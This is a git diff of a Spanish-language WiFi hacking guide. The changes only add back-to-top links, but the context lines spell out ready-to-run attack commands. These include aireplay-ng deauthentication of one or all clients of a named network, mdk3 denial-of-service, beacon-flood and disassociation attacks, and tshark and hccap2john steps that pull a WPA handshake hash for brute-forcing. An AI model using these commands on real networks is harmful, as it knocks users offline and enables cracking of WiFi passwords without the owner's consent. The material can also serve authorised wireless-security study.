@@ -145,6 +145,8 @@ En este caso se llama WLAN0 por lo que para ponerla en modo monitor seria :
     wlan0mon Nuestra interfaz de red (obvio xD)
     -h MAC ADDRESS falsa para injectar en un punto de acceso 
 
+[Subir](#top)
+
 <a name="item7"></a>
 ### ATAQUE DE DESAUTENTIFICACION DIRIGIDO
 
@@ -157,6 +159,8 @@ SINOPSIS: Expulsaremos un cliente conectado a una red , para forzar que conecte 
 --En otra consola , procedemos a desautenticar al cliente visitar **1 para entender parametros 
 
 ``` $ aireplay-ng -0 10 -e MovistarE34A -c MACDELCLIENTE wlan0mon ```
+
+[Subir](#top)
 
 <a name="item8"></a>
 ### ATAQUE DE DESAUTENTIFICACION GLOBAL
@@ -171,6 +175,8 @@ SINOPSIS: Expulsaremos todos los clientes conectados a una red , para forzar que
 
 ``` $ aireplay-ng -0 10 -e MovistarE34A -c FF:FF:FF:FF:FF:FF wlan0mon ```
 
+[Subir](#top)
+
 <a name="item9"></a>
 ### ATAQUE DDOS (DENIED OF SERVICE)
 
@@ -183,6 +189,8 @@ SINOPSIS: Expulsaremos todos los clientes conectados a una red ,durante un tiemp
 --Otra manera de hacer un DDOS a la red seria( en -a se pone el BSSID del router objetivo :
 
 ``` $ mdk3 wlan0mon a -a 00:15:dc:5c:61:2f ```
+
+[Subir](#top)
 
 <a name="item10"></a>
 ### ATAQUE BEACON FLOOD MODE ATTACK
@@ -201,6 +209,8 @@ SINOPSIS: Aqui el objetivo es saturar el espectro de onda (canal de comunicacion
     $ mdk3 wlan0mon b -f redes.txt -a -s 1000 -c 1
 ```
 
+[Subir](#top)
+
 <a name="item11"></a>
 ### ATAQUE DISASSOCIATION AMOK MODE ATTACK
 
@@ -211,6 +221,8 @@ SINOPSIS: Es otro tipo de ataque de disasociacion dirigido a una lista de client
     $ nano blacklist    y dentro copiamos los clientes ESTATIONS a desautentificar
     $  mdk3 wlan0mon d -w blacklist -c 1 
 ```
+
+[Subir](#top)
 
 ## VALIDACIONES DE HANDSHAKE
 <a name="item12"></a>
@@ -228,6 +240,8 @@ SINOPSIS: Formaremos el paquete final a partir del Capture-XX.cap con el cual tr
         
 ``` $ tshark -r Captura-01.cap -R "wlan.fc.type_subtype==0x08 ||  wlan.fc.type_subtype==0x05 || eapol" -2 -w paqfinal -F pcap 2>/dev/null ```
 
+[Subir](#top)
+
 <a name="item14"></a>
 ### EXTRACCION DEL HASH EN EL  HANDSHAKE
 
@@ -240,6 +254,8 @@ SINOPSIS: YA vamos al turror, sacar el hash para posteriormente romperlo y sacar
 --Ahora lo pasamos por hccap2john y conseguimos el fichero del hash por fin (Solo queda romperlo por fuerza bruta)
 
 ``` $ hccap2john miCaptura.hccap > miHash ```
+
+[Subir](#top)
 
 ## FUERZA BRUTA AL HASH > CONTRASEÑA
 <a name="item15"></a>
